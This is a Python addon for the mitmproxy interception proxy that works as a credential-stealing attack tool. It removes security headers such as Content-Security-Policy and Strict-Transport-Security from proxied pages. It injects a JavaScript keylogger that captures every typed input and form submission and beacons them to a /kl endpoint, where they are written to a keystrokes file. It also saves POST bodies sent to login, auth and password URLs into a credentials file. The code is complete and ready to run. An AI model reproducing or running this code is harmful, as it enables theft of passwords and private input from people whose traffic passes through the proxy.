import os, json
from mitmproxy import http
from datetime import datetime

LOG_DIR = os.environ.get("LOG_DIR", os.path.join(os.path.expanduser("~"),".wizza","logs"))
CAUGHT  = f"{LOG_DIR}/credentials.txt"
KEYS    = f"{LOG_DIR}/keystrokes.txt"

# JS uses same-origin relative path /kl so it works through any tunnel
JS = """<script>
(function(){
  var sid=Math.random().toString(36).substr(2,9), kb={}, last={};
  function send(obj){
    try{fetch('/kl',{method:'POST',body:JSON.stringify(obj)}).catch(function(){});}catch(e){}
  }
  // Capture every keystroke in any input/textarea
  document.addEventListener('input',function(e){
    var el=e.target;
    if(el.tagName==='INPUT'||el.tagName==='TEXTAREA'){
      var k=el.name||el.id||el.placeholder||el.type||'field';
      kb[k]=el.value;
    }
  },true);
  // Capture form submissions
  document.addEventListener('submit',function(e){
    var d={},els=e.target.querySelectorAll('input,textarea,select');
    for(var i=0;i<els.length;i++){
      if(els[i].name||els[i].id) d[els[i].name||els[i].id]=els[i].value;
    }
    send({sid:sid,type:'submit',data:d,url:location.href});
  },true);
  // Flush keylog every 4 seconds if changed
  setInterval(function(){
    if(JSON.stringify(kb)!==JSON.stringify(last)){
      send({sid:sid,type:'keylog',data:kb,url:location.href});
      last=JSON.parse(JSON.stringify(kb));
    }
  },4000);
})();
</script>"""

def ts():
    return datetime.now().strftime("%H:%M:%S")

def response(flow: http.HTTPFlow):
    # Strip security headers
    for h in ["Content-Security-Policy","X-Frame-Options",
              "Strict-Transport-Security","X-XSS-Protection",
              "Content-Security-Policy-Report-Only"]:
        flow.response.headers.pop(h, None)
    # Inject JS into HTML pages
    ct = flow.response.headers.get("Content-Type","")
    if "text/html" in ct:
        try:
            b = flow.response.text
            if "</body>" in b:
                b = b.replace("</body>", JS + "</body>", 1)
            elif "</html>" in b:
                b = b.replace("</html>", JS + "</html>", 1)
            else:
                b += JS
            flow.response.text = b
        except Exception:
            pass

def request(flow: http.HTTPFlow):
    path = flow.request.path

    # Handle /kl keylog beacon (intercept before forwarding to target)
    if path == "/kl" and flow.request.method == "POST":
        os.makedirs(LOG_DIR, exist_ok=True)
        try:
            d = json.loads(flow.request.text)
            t = d.get("type","?")
            url = d.get("url","")
            data = d.get("data",{})
            line = f"[{ts()}] [{t}] {url}\n"
            for k,v in data.items():
                line += f"  {k}: {v}\n"
            line += "\n"
            open(KEYS,"a").write(line)
            print(f"[KL] {t} — {url[:60]}", flush=True)
            for k,v in data.items():
                print(f"     {k}: {v}", flush=True)
        except Exception as e:
            open(KEYS,"a").write(f"[{ts()}] parse error: {e}\n")
        # Return 204 — don't forward to target
        flow.response = http.Response.make(204, b"", {"Access-Control-Allow-Origin": "*"})
        return

    # Capture POST to login/auth paths from the real site
    if flow.request.method == "POST":
        p = path.lower()
        if any(k in p for k in ["login","auth","signin","session","password","wp-login"]):
            os.makedirs(LOG_DIR, exist_ok=True)
            line = f"[{ts()}] POST {flow.request.host}{path}\n{flow.request.text}\n---\n"
            open(CAUGHT,"a").write(line)
            print(f"[POST] {flow.request.host}{path}", flush=True)
